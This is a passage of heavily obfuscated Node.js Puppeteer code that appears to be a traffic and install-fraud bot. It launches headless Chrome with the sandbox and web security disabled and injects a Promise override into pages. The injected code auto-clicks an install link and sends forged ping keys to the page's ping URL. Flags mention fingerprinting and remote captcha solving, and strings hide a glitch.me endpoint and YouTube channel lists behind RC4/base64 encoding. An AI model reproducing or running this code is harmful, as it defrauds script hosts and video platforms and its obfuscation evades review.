                K = Q[J - (-0xd7 * -0x14 + 0x6ca + -0x1793)] ^ Q[J - (-0x17f8 + 0x13 * 0x7 + -0x1 * -0x177b)] ^ Q[J - (0x29 * 0x5d + 0x26b7 + -0x358e)] ^ Q[J - (-0x199 * 0x5 + -0x115e + 0x1 * 0x196b)], Q[J] = K << 0x1 * -0x377 + 0x53c * -0x3 + 0x132c | K >>> -0x1497 + 0x1f * -0xcf + -0x2dc7 * -0x1;
              for (J = 0x1 * 0x1f45 + 0xb * 0x25d + -0x3944; J < 0x18e7 + -0x25 * 0x1f + -0x1458; J += -0x1e * 0x13d + -0x7b * 0x44 + 0x45d7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1db7 + 0x2f * -0xb8 + 0x416 | L >>> 0x3 * 0xe5 + 0x1 * -0xab5 + 0x821) + (M & N | ~M & O) + P + (0x5d4c0a6a + 0x1 * -0x969a9c94 + 0x93d10bc3) + Q[J] << -0x223a * -0x1 + -0xb2 * 0x34 + -0x13 * -0x1a) << 0x156 + -0x167c + 0x152b | P >>> 0x2 * 0xd69 + 0x234d + -0x6e4 * 0x9) + (L & (M = M << -0x13d7 + 0xd70 + 0x685 | M >>> 0x20b * 0x1 + -0x158a + -0x1381 * -0x1) | ~L & N) + O + (0x1a5acc69 + 0x1196065 * -0x43 + -0x203 * -0x447f35) + Q[J + (0x1ad1 + -0x1 * 0x1a0 + -0x1930)] << -0x1f05 + -0x3d * 0x61 + -0x1 * -0x3622) << -0x32b + 0x1f84 + -0x1c54 | O >>> -0xa5 * -0x6 + -0x25 * -0x31 + 0x2 * -0x56c) + (P & (L = L << 0x1 * -0x2026 + 0x942 + 0x1702 | L >>> 0x3f * -0x2 + 0xca4 + 0x15 * -0x94) | ~P & M) + N + (-0x1 * 0x9fb6832f + -0x31 * 0x3aaffb1 + 0x1adf3eda9) + Q[J + (-0x11dd + -0xfef * -0x2 + -0xdff)] << 0x1b54 + -0x251 * 0xe + 0x51a) << -0x1 * -0xbcf + -0x255a + 0x1990 | N >>> -0x2227 + 0x1064 * 0x1 + 0x2 * 0x8ef) + (O & (P = P << 0x1b * -0x2 + -0x1d7d * 0x1 + 0x1dd1 | P >>> 0xd * 0x55 + -0x198c + 0x153d) | ~O & L) + M + (-0x1d06 * -0xb526 + 0x1 * -0xdb4db9d + 0x53adc852) + Q[J + (-0x1 * -0x168b + -0x1 * -0xf3e + 0x3c7 * -0xa)] << -0x1ac3 + 0x1fb * 0x9 + -0x10 * -0x8f) << 0x955 + 0x1a80 + -0x30 * 0xbf | M >>> -0x4 * -0x43c + -0x35f * 0x5 + -0x6 * -0x1) + (N & (O = O << -0x7 * -0x2ca + 0x91e * 0x3 + -0x2ec2 | O >>> 0x5a * -0xc + -0xe25 + -0x1 * -0x125f) | ~N & P) + L + (-0x4f29d96d + 0x958acd89 + 0x1421857d) + Q[J + (-0xb * 0x2c3 + 0xf5b + 0xf0a)] << -0xa92 + -0x16 * 0xc + 0xb9a, N = N << 0x204 + -0x1742 + -0x557 * -0x4 | N >>> 0x1 * 0x1542 + 0xfec + 0x94b * -0x4;
              for (; J < -0x298 + -0x7e4 * -0x1 + 0x2 * -0x292; J += -0x3a7 + 0xe55 + -0xaa9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x11b + -0xf68 + 0x263 * 0x6 | L >>> -0x1902 + 0x1a89 * -0x1 + 0x33a6 * 0x1) + (M ^ N ^ O) + P + (-0x179069 * 0x829 + -0x1dbe14 * 0x176 + 0x15a9705aa) + Q[J] << -0x5 * -0x525 + -0xa4 * 0x2a + 0x3 * 0x65) << -0xcf3 + 0x913 + -0x3e5 * -0x1 | P >>> 0x2 * -0x63a + -0x1e * 0x5c + 0x1757) + (L ^ (M = M << -0x2525 + -0xcb7 + 0x31fa | M >>> 0x1a * 0x149 + -0x117d + -0x5 * 0x32f) ^ N) + O + (0x55b16c57 + -0x5480c0bd + 0x6da94007) + Q[J + (0x1bc4 * 0x1 + 0x1e6d * -0x1 + 0x2aa)] << -0x121f * -0x1 + -0x2fe + -0xf21) << -0x2195 + -0x8d3 * -0x2 + 0xff4 | O >>> -0x3ea + -0x6b1 * -0x5 + 0x18 * -0x13a) + (P ^ (L = L << -0x1766 + -0x2137 + 0x38bb | L >>> 0x1b09 + -0x1a91 + -0x76) ^ M) + N + (0x2934b * 0x5077 + 0x3c6b883b + -0x1f5be74b * 0x5) + Q[J + (0x4e3 + -0x1463 + 0xf82)] << -0x1 * 0xc15 + -0x1 * 0x2121 + 0x2d36 * 0x1) << 0x2 * -0x85f + -0x3bf * -0x9 + 0x2 * -0x87a | N >>> 0x2494 + -0x3f * -0x34 + -0x3145) + (O ^ (P = P << -0x1 * 0xeed + -0x25bc + 0x34c7 | P >>> -0x1f04 + -0x22d1 + 0x41d7) ^ L) + M + (0xf3a * 0x57a43 + 0x10b3d3 * -0x691 + 0x891f17f6) + Q[J + (0x1f66 * 0x1 + 0xe77 + -0x16ed * 0x2)] << 0x4bc + -0x5 * -0x445 + 0x25f * -0xb) << 0x1 * 0xa46 + 0xc53 + -0x1694 | M >>> 0x28 * 0x95 + -0xa22 + -0xd0b) + (N ^ (O = O << 0x3b9 * -0x2 + -0x79 + 0x809 | O >>> -0x518 + 0xd43 + -0x829 * 0x1) ^ P) + L + (-0x1f46d * -0x57dc + 0xc * -0x1167c88 + -0x2fd756ab) + Q[J + (-0xb3 * -0x17 + -0x2 * -0x287 + 0x1 * -0x151f)] << 0xb1 * 0x15 + 0x139 * 0xc + -0x1d31, N = N << -0x2 * 0xdbd + 0x7f * 0x1 + -0x1b19 * -0x1 | N >>> 0x2 * 0x326 + 0x2 * -0xc0b + -0x11 * -0x10c;
              for (; J < -0x243a * -0x1 + 0x199c + -0x3d9a; J += -0x143 + -0x158 + 0x2a0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x10e8 + -0x2360 + 0x127d | L >>> -0x19 * -0x9e + -0x4c9 * -0x8 + -0x359b) + (M & N | M & O | N & O) + P - (0x30d066dc + -0x12 * -0xac8d4f2 + -0x820b1cbc) + Q[J] << 0x1 * -0xb01 + -0x1f9 * 0xd + 0x24a6) << 0x2c * 0xb5 + 0xd92 + -0x2ca9 | P >>> -0x2361 + 0x24a5 + 0x1b * -0xb) + (L & (M = M << 0x1 * 0x314 + -0x3 * 0xc83 + 0x2293 | M >>> -0x17 * -0x15a + -0x19 * -0xe8 + -0x35bc) | L & N | M & N) + O - (-0xc9dd7898 + -0x4dece44 + 0x13fa08a00) + Q[J + (-0x1331 + 0x2 * -0xb4a + 0x29c6)] << 0x18d0 + 0x2347 + -0x3c17 * 0x1) << -0x221e + 0x8d8 + -0x25 * -0xaf | O >>> 0x328 + -0x17ec + 0x6f5 * 0x3) + (P & (L = L << 0x1226 * 0x2 + 0x81d * -0x4 + -0x3ba | L >>> -0x132c + -0x152 * 0x3 + 0x1724) | P & M | L & M) + N - (0x1 * 0x4171a580 + -0x51f9c328 + -0x15921022 * -0x6) + Q[J + (-0x2 * 0x86 + -0xe50 + 0xf5e)] << -0xb * -0x315 + -0x4b8 * -0x2 + -0x2b57) << -0x3 * -0x569 + -0xdfa + -0x23c | N >>> 0x9f1 * 0x2 + 0xd * 0x170 + -0x2677) + (O & (P = P << -0x1 * -0xe71 + -0x2c * -0x6 + -0xf5b | P >>> -0x679 * -0x6 + 0xcdd + -0x33b1) | O & L | P & L) + M - (-0x1 * 0x6f86f3a3 + -0x5d6e353f + -0x1 * -0x13dd96c06) + Q[J + (-0x4cf * 0x1 + 0x970 + -0x49e)] << 0x97 * -0x3d + -0x3 * 0x9f5 + 0x41da) << -0x651 + -0x2276 + 0x5d4 * 0x7 | M >>> 0xe12 * 0x2 + 0x7c * 0x17 + -0x272d * 0x1) + (N & (O = O << 0x9a9 + -0x270e + 0x1d83 | O >>> 0x1cfa + 0x2 * -0x838 + 0x8 * -0x191) | N & P | O & P) + L - (0x30b7b2 * 0x1e + -0x1 * -0xdccd7ddf + -0x719ec197) + Q[J + (0xd * 0x257 + -0x1 * -0x11ab + 0x803 * -0x6)] << -0x40f + 0x2064 + -0x1c55, N = N << -0x153b * 0x1 + -0xf80 + 0x24d9 | N >>> -0x20c7 + -0x23f * 0x1 + 0x1 * 0x2308;
              for (; J < -0x25c9 + -0x1c32 + 0x1619 * 0x3; J += -0x1 * 0xc9f + 0xf * 0x269 + 0x1cf * -0xd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1598 + -0x248 * -0x8 + 0x15 * 0x29 | L >>> -0x1 * 0x1a51 + 0x101c + 0xa50) + (M ^ N ^ O) + P - (0x85ac13 * -0x32 + -0x1 * -0x5650d476 + 0x1 * -0x697fa96) + Q[J] << -0x66a * -0x5 + 0xcd3 + 0x9 * -0x4fd) << 0xa5 * -0x15 + 0x8d7 + 0x4b7 | P >>> 0xc97 + 0x1b07 * -0x1 + 0xe8b) + (L ^ (M = M << 0xac7 + 0x2 * 0xb0c + 0x41 * -0x81 | M >>> -0x1831 + -0x1d4e + -0x1 * -0x3581) ^ N) + O - (0x65fdeab6 + 0x3 * -0x11f50054 + 0x57e5470) + Q[J + (-0x355 * -0x5 + 0x22b + -0x12d3)] << -0x18d9 + -0x1 * -0x263b + -0xd62) << -0x13b9 + -0xd * -0x24b + -0xa11 | O >>> 0xb5 * -0x2 + 0xe7 * -0x2b + 0x2852) + (P ^ (L = L << -0x37f + -0x1d0a + 0x283 * 0xd | L >>> -0x1465 + 0x1f3a + 0x11 * -0xa3) ^ M) + N - (-0x37b7ac3 * 0x4 + 0x175f3dd5 + -0x71 * -0x6411f1) + Q[J + (-0x63 * 0x51 + 0xd3f * 0x1 + 0x1216 * 0x1)] << 0x1cf * 0x9 + 0x8f * 0x24 + 0x45 * -0x87) << 0x1a19 + 0x13 * -0x135 + -0x325 | N >>> 0x8d * 0x2d + 0x6a1 + -0x1f4f) + (O ^ (P = P << 0x1 * 0x58d + 0x2046 + -0x25b5 | P >>> -0x202b + -0x1a77 + 0x3aa4) ^ L) + M - (-0x63c48495 * 0x1 + 0xbec6827 + -0x8 * -0x11aeab53) + Q[J + (0x212a + 0x1bd1 + -0x1 * 0x3cf8)] << 0x3 * 0x2b3 + -0x1e6a + 0x1 * 0x1651) << 0x4b1 + -0x1 * -0x499 + 0x317 * -0x3 | M >>> -0x2063 + 0x1ee6 + 0x4 * 0x66) + (N ^ (O = O << -0x1f64 + 0x1 * -0x14d9 + 0x345b | O >>> -0x3a9 * -0x8 + 0x1 * 0x8f3 + -0x2639) ^ P) + L - (0x50b86839 + -0x8259ec * 0x27 + -0x4fd * 0x173f7) + Q[J + (0xc51 + 0x19c0 + -0x23d * 0x11)] << 0x8 * -0x155 + -0x15 * -0xac + -0x374, N = N << 0x19 * -0x18a + 0xa7d + 0x1c1b | N >>> 0x2414 + 0xe0a * -0x2 + -0x7fe;
              this['h0'] = this['h0'] + L << -0x641 + 0x2dd + -0x1b2 * -0x2, this['h1'] = this['h1'] + M << 0x1 * 0x33 + 0x1d82 + -0x1db5, this['h2'] = this['h2'] + N << 0x1e0 * 0x5 + -0x2c4 + -0x2 * 0x34e, this['h3'] = this['h3'] + O << 0x8a * -0x47 + -0xd3f + 0x3385, this['h4'] = this['h4'] + P << 0x5 * 0x22f + 0x11d9 + -0x1cc4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x127f * 0x1 + 0x140c * -0x1 + 0x5 * 0x7bb & 0x5ac + 0x2b4 * 0x6 + -0x15d5] + w[J >> 0xecd + -0x17 * 0x10e + 0x98d & -0xbbb + -0x395 + 0xf5f] + w[J >> -0x2216 * -0x1 + 0x70a * -0x1 + -0x1af8 & -0x219f + -0x2249 + -0x7f * -0x89] + w[J >> -0x1 * 0xd17 + 0xc2f + -0x1 * -0xf8 & -0xf1d + -0x5 * -0x6a9 + -0x1221] + w[J >> 0x1d2 * -0x1 + -0x2 * 0x30b + 0x1 * 0x7f4 & -0x1506 + 0x1 * 0x643 + 0xed2] + w[J >> -0x25c0 + 0x613 * -0x5 + 0x4427 & 0x248f + 0x2356 + -0x47d6] + w[J >> -0x1 * 0xaee + -0x160c + 0x20fe & 0x340 + -0xbf * 0x3 + -0xf4] + w[-0x1388 * -0x1 + 0x2242 + 0x35bb * -0x1 & J] + w[K >> -0xb4b * -0x2 + -0x49 + -0x1631 * 0x1 & 0xa07 + -0x190 + -0x868] + w[K >> -0xfd7 + 0x2038 + 0x17b * -0xb & -0x1e37 * 0x1 + -0x5 * -0x5ff + 0x4b] + w[K >> 0xe + -0x23e6 + 0x23ec & -0x2 * 0x2fc + -0xb65 * 0x1 + 0x4 * 0x45b] + w[K >> 0x2 * -0xe26 + 0x4 * 0x8c2 + -0x6ac & 0xdd1 + -0x25a9 + 0x17e7] + w[K >> 0x242e + -0x192c + 0xaf6 * -0x1 & 0x1b06 + 0xd86 * -0x1 + 0x47b * -0x3] + w[K >> 0xe9 * -0xe + 0x57 * 0x67 + -0x769 * 0x3 & -0x7 * 0x2a6 + 0x5b * 0x39 + -0x3 * 0x8e] + w[K >> 0xb32 * 0x2 + 0xa62 + 0x4ae * -0x7 & 0x28c * -0x9 + -0xa16 + -0x2111 * -0x1] + w[0x2b * 0xbf + -0x22bb * 0x1 + 0x2b5 & K] + w[L >> 0xb * 0x15b + -0x1526 + 0x659 & 0xa * -0xac + 0x193a + -0x1273] + w[L >> 0x15df * -0x1 + -0x15bb * -0x1 + 0x3c & -0x22c2 + 0x1874 + -0x1 * -0xa5d] + w[L >> 0x44f * -0x7 + 0xf17 * -0x1 + 0x2d54 & 0x439 + -0x1 * 0xbf6 + 0x7cc] + w[L >> 0x1137 + 0x25fa + 0x1 * -0x3721 & 0x1eee * -0x1 + -0x9c1 + 0x28be] + w[L >> 0x1 * 0x260f + 0x2 * 0xdee + -0x41df & -0x186f + -0x1 * 0x24a1 + -0x3d1f * -0x1] + w[L >> -0x263 * -0xd + -0x1f77 + 0x78 & 0x248a + 0xd * -0x1d3 + -0xcc4] + w[L >> -0x22ff * -0x1 + -0x7d3 * -0x2 + -0x32a1 & -0x4b2 * -0x5 + 0x21d2 + -0x393d] + w[-0x15c8 + -0x1151 + 0x38 * 0xb3 & L] + w[M >> 0x1763 * 0x1 + -0xcb0 + -0xa97 & 0x1 * 0x1baa + -0x2 * 0xe2e + 0xc1] + w[M >> -0xf1e + -0x1193 * -0x2 + -0x13f0 & 0x10d0 + -0x147c + 0x1 * 0x3bb] + w[M >> -0xcae + 0x2015 + -0x1353 & -0x55f * -0x5 + 0x1428 + -0x2ef4] + w[M >> 0x160d + 0x1b4f + 0x9dc * -0x5 & -0x4 * -0xd3 + -0x268 + -0x1 * 0xd5] + w[M >> -0xce5 + 0x1f75 + 0x316 * -0x6 & -0x5 * -0x8b + 0x1 * 0x2327 + -0x25cf] + w[M >> 0x1cd4 + 0x192b + -0x35f7 & 0x1bdc + -0x2 * -0x335 + -0x2237] + w[M >> 0x1e01 * -0x1 + -0x1 * -0x7de + -0x1 * -0x1627 & 0x1 * 0x16a8 + -0x1 * 0x188c + -0x1 * -0x1f3] + w[0x148a + 0x6ae + -0x1b29 & M] + w[N >> 0xb6e * -0x1 + 0x20c8 + -0x153e & -0x1b65 + 0x1803 + 0x1 * 0x371] + w[N >> 0x1e9 * 0x1 + -0x59 * -0x35 + -0x2 * 0xa1f & 0xe20 + -0x1f87 + 0x6 * 0x2e9] + w[N >> -0x1e95 + -0x643 + 0x24ec & -0x20e * 0xf + -0x1 * 0xa5 + -0x6 * -0x541] + w[N >> 0x29 * -0x1b + -0x1f4c + 0x23af & 0x6d * -0x9 + -0x221c + -0x200 * -0x13] + w[N >> -0x1e44 + 0x21d3 * 0x1 + -0x383 & -0x22a3 + 0x26e4 + 0x219 * -0x2] + w[N >> 0x59 * 0x16 + 0xfcd + -0x176b & 0x16d2 + -0x492 + -0x1231] + w[N >> 0x21a2 + 0xa7 * -0x35 + -0x5 * -0x31 & 0x11b * -0x7 + -0xd * -0x281 + -0x18c1] + w[-0x3ee + 0x18fc + -0x14ff & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * 0x16f9 + -0x1 * 0x119 + 0x182a & 0x204f * 0x1 + -0x1094 + 0x1 * -0xebc,
                J >> 0xa * -0x4 + 0x1fd0 + -0x1f98 & -0xd85 + 0x7 * -0x283 + 0x2019,
                J >> 0x178 + -0x1016 + 0xea6 & 0xbee * -0x3 + -0x212b + 0x45f4,
                0x1e * 0x115 + 0xef9 + -0x2e70 & J,
                K >> -0x236e + -0x2f2 * 0xd + 0x10 * 0x49d & -0x19a4 + -0x22bc + -0x3d5f * -0x1,
                K >> -0x1567 * 0x1 + -0x9e1 * 0x1 + -0x76 * -0x44 & -0xd * 0x272 + 0x11f9 + 0xed0,
                K >> -0x1 * 0x1394 + -0xcc2 + 0x205e & 0x1a34 + -0xdf2 + 0x1 * -0xb43,
                -0xad0 + -0x303 * 0x3 + 0x14d8 & K,
                L >> -0x218a + -0x1ce1 * -0x1 + 0x1 * 0x4c1 & 0x950 + -0x529 + -0x328,
                L >> 0x2fb + -0x1 * -0x17cf + -0x1aba & 0x17d9 + -0x101 * -0x1 + -0x17db,
                L >> -0x1 * 0x2115 + -0x11 + 0x212e & 0x9dc + 0x7a3 + -0x1080,
                0x104 + 0x449 + -0x44e & L,
                M >> 0xb29 * 0x1 + 0xf0f + -0x1a20 * 0x1 & -0x173a + 0x2099 + -0x860,
                M >> -0x5 * 0x5cb + -0x2413 + -0x411a * -0x1 & -0x655 + 0x1f97 + -0x1843,
                M >> 0x1 * 0x19c7 + 0xcf4 + -0x26b3 & 0x1d22 + -0xc35 + -0xfee,
                0x21df + -0x1827 + -0x8b9 & M,
                N >> -0x119 * 0x1d + -0x7e0 + 0x27cd & -0x240f + 0x1096 + -0x51e * -0x4,
                N >> 0x1 * -0x102d + -0x78a + 0x17c7 & 0x249b + -0x22ef * 0x1 + -0xad,
                N >> 0x1 * 0x2161 + 0xa9b + -0x2bf4 * 0x1 & 0x35 * 0x9 + 0x1f9d + -0x207b,
                -0x65 * -0x52 + 0x1 * -0xf61 + -0xffa & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x23a3 + -0x8c6 + -0x1 * -0x2c7d), (K = new DataView(J))['setUint32'](-0x244c + -0xdab * 0x1 + 0x31f7, this['h0']), K['setUint32'](0x1430 + -0x11f7 + 0x235 * -0x1, this['h1']), K['setUint32'](-0x1119 + -0x905 + 0xd13 * 0x2, this['h2']), K['setUint32'](-0x174d + 0x1 * 0x641 + -0x88c * -0x2, this['h3']), K['setUint32'](0xb5 * -0x17 + -0x2 * 0xccb + -0x29e9 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1fd * -0x6 + 0x1921 + -0xd33];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x160e + 0x6c + 0x1aa * 0xd;
            J[0x5d5 * -0x1 + -0x1 * -0x13f9 + -0x1 * 0xe24]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x22e * -0x3 + -0x18eb * -0x1 + 0x1f75 * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x980 * 0x4 + -0x1 * 0x1e3e + -0x7c1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xbe7 * -0x3 + 0x3 * -0xb5c + 0x45ca;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x3 * -0xb5d + 0x1619 * -0x1 + 0x1 * -0x622), Promise['resolve'](-0x23ce + 0x18e * -0xd + -0x3805 * -0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2f * -0x61 + 0x2537 + -0x3706; j < -0x1eb4 + 0x3 * 0xa3d + -0x2; j++)
    i();
}
const NETWORK_PATIENCE = 0x1528 * 0x1 + 0x1 * -0x30e3 + -0x1 * -0x3afb + (0x1a11 * 0x1 + -0x937 + -0x2 * 0x291) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2 * -0xd46 + -0x237b * -0x1 + 0x1 * -0x8ec) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1501 * -0x1 + -0xb * 0x2f8 + 0x35a9);
    let h = e[f];
    return h;
  }, d(b, c);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1501 * -0x1 + -0xb * 0x2f8 + 0x35a9);
    let h = e[f];
    if (b['VDXzuH'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xb30 + 0x1122 + -0x5 * 0x5aa, s, t, u = -0x1628 + 0xd9 + 0x154f; t = n['charAt'](u++); ~t && (s = r % (0xfd7 + -0x9b * 0x5 + 0x2a * -0x4e) ? s * (-0x6 * 0x2aa + -0x1f61 + 0x2cd * 0x11) + t : t, r++ % (-0x13fa + -0x7c6 * 0x3 + -0x90 * -0x4d)) ? p += String['fromCharCode'](0xb * -0x356 + -0xa12 + 0x2fc3 & s >> (-(-0xda3 * -0x2 + 0xf9 * -0x27 + 0xaab) * r & 0x169c + -0x1d * 0x125 + -0x1 * -0xa9b)) : -0x2e * -0x1d + 0x1aac + -0x1fe2) {
          t = o['indexOf'](t);
        }
        for (let v = -0x161 + -0x1456 + 0x15b7, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x7 * 0x2e3 + 0x223 * -0x3 + -0xdbc))['slice'](-(-0x1f32 + 0x1 * 0x31b + 0x1c19));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xa7 * 0xb + 0x8 * 0x39b + 0x1 * -0x2405,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x80b * 0x3 + 0xd * 0x137 + -0x27ec; u < 0x1c8a + 0x1cf8 + -0x6 * 0x96b; u++) {
          p[u] = u;
        }
        for (u = -0x14d + 0x2 * 0x12d5 + 0x141 * -0x1d; u < 0x5d * -0x6 + -0x62f * 0x5 + 0x2219; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xc3 * 0xc + 0xb * 0x236 + -0x2076), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * 0x25f + -0x5db * -0x1 + -0x1 * 0x83a, q = 0x67 * 0x19 + -0x5 * -0x139 + -0xe6 * 0x12;
        for (let v = -0x1 * 0x39f + -0x19e5 + -0x1 * -0x1d84; v < n['length']; v++) {
          u = (u + (-0x36b + -0x14d4 + 0x20 * 0xc2)) % (0x9a2 + -0x571 * -0x1 + 0x1 * -0xe13), q = (q + p[u]) % (0x527 * 0x1 + -0x5a7 * 0x1 + 0x60 * 0x4), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1b98 + 0x1 * -0x263e + 0x42d6)]);
        }
        return t;
      };
      b['jWHguH'] = m, c = arguments, b['VDXzuH'] = !![];
    }
    const j = e[-0xee + -0x2580 + 0x1337 * 0x2],
      k = f + j,
      l = c[k];
    return !l ? (b['AbESKo'] === undefined && (b['AbESKo'] = !![]), h = b['jWHguH'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1501 * -0x1 + -0xb * 0x2f8 + 0x35a9);
    let h = e[f];
    if (c['ebkiOE'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xb30 + 0x1122 + -0x5 * 0x5aa, r, s, t = -0x1628 + 0xd9 + 0x154f; s = m['charAt'](t++); ~s && (r = q % (0xfd7 + -0x9b * 0x5 + 0x2a * -0x4e) ? r * (-0x6 * 0x2aa + -0x1f61 + 0x2cd * 0x11) + s : s, q++ % (-0x13fa + -0x7c6 * 0x3 + -0x90 * -0x4d)) ? o += String['fromCharCode'](0xb * -0x356 + -0xa12 + 0x2fc3 & r >> (-(-0xda3 * -0x2 + 0xf9 * -0x27 + 0xaab) * q & 0x169c + -0x1d * 0x125 + -0x1 * -0xa9b)) : -0x2e * -0x1d + 0x1aac + -0x1fe2) {
          s = n['indexOf'](s);
        }
        for (let u = -0x161 + -0x1456 + 0x15b7, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x7 * 0x2e3 + 0x223 * -0x3 + -0xdbc))['slice'](-(-0x1f32 + 0x1 * 0x31b + 0x1c19));
        }
        return decodeURIComponent(p);
      };
      c['xuQVev'] = i, b = arguments, c['ebkiOE'] = !![];
    }
    const j = e[0xa7 * 0xb + 0x8 * 0x39b + 0x1 * -0x2405],
      k = f + j,
      l = b[k];
    return !l ? (h = c['xuQVev'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x18a7 * 0x1 + -0x1bf9 + 0x352; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
